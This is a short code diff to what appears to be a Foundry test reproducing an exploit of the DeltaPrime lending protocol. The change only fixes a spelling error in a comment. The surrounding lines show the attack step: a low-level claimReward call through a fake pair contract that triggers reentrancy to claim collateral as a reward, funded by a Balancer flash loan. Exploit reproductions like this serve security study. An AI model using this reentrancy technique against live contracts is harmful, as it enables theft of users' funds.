@@ -141,7 +141,7 @@ contract DeltaPrimeExp is Test {
         bytes memory claimRewardData =
             abi.encodePacked(abi.encodeCall(ISmartLoan.claimReward, (address(fakePairContract), ids)), priceData);
 
-        address(SmartLoan).call(claimRewardData); // triger reenter attack, convert collateral and debt eth to weth and claim as reward
+        address(SmartLoan).call(claimRewardData); // trigger reenter attack, convert collateral and debt eth to weth and claim as reward
         // SmartLoan.claimReward(address(fakePairContract), ids);
 
         WETH.transfer(address(Balancer), flashLoanAmount);
